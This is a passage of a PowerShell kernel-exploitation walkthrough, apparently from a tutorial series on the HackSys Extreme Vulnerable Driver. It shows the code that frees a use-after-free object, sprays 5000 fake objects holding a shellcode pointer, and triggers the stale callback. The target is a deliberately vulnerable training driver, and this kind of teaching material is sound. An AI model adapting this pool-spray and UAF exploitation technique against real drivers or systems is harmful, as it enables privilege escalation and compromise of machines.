[EVD]::DeviceIoControl($hDevice, 0x222013, $No_Buffer, $No_Buffer.Length, $null, 0, [ref]0, [System.IntPtr]::Zero) |Out-null
 
# Free UAF Object
#---
# 0x22201B - HACKSYS_EVD_IOCTL_FREE_UAF_OBJECT
echo "[+] Freeing UAF object"
[EVD]::DeviceIoControl($hDevice, 0x22201B, $No_Buffer, $No_Buffer.Length, $null, 0, [ref]0, [System.IntPtr]::Zero) |Out-null
 
# Fake Object allocation
#---
# 0x22201F - HACKSYS_EVD_IOCTL_ALLOCATE_FAKE_OBJECT
echo "[+] Spraying 5000 fake objects"
$Buffer = $ShellcodePointer + [Byte[]](0x42)*0x5B + 0x00 # len = 0x60
for ($i=0;$i -lt 5000;$i++){
    [EVD]::DeviceIoControl($hDevice, 0x22201F, $Buffer, $Buffer.Length, $null, 0, [ref]0, [System.IntPtr]::Zero) |Out-null
}
 
# Trigger stale callback
#---
# 0x222017 - HACKSYS_EVD_IOCTL_USE_UAF_OBJECT
echo "`n[>] Triggering UAF vulnerability!`n"
[EVD]::DeviceIoControl($hDevice, 0x222017, $No_Buffer, $No_Buffer.Length, $null, 0, [ref]0, [System.IntPtr]::Zero) |Out-null
```

![](/images/exploit/fuzzySecurity/20180314_11.jpg)